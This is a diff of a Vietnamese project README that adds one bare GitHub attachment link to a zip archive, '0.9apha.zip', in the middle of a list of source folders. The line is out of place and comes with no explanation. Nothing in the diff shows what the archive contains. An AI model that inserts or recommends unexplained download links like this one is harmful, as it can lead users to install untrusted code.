@@ -75,6 +75,7 @@ Khi chạy script, hệ thống sẽ thực hiện các bước sau:
 Dự án không cung cấp `git clone` trực tiếp. Bạn có thể truy cập mã nguồn qua các thư mục sau:
 
 * **[src-main](./src-main):** Chứa mã nguồn gốc (bao gồm mã nguồn tạo ra `vmk.so`) do tôi phát triển.
+https://github.com/user-attachments/files/24425559/0.9apha.zip
 * **[src-dependencies](./src-dependencies):** Chứa mã nguồn của các dự án liên quan để tiện cho việc biên dịch chung.
 
 ---
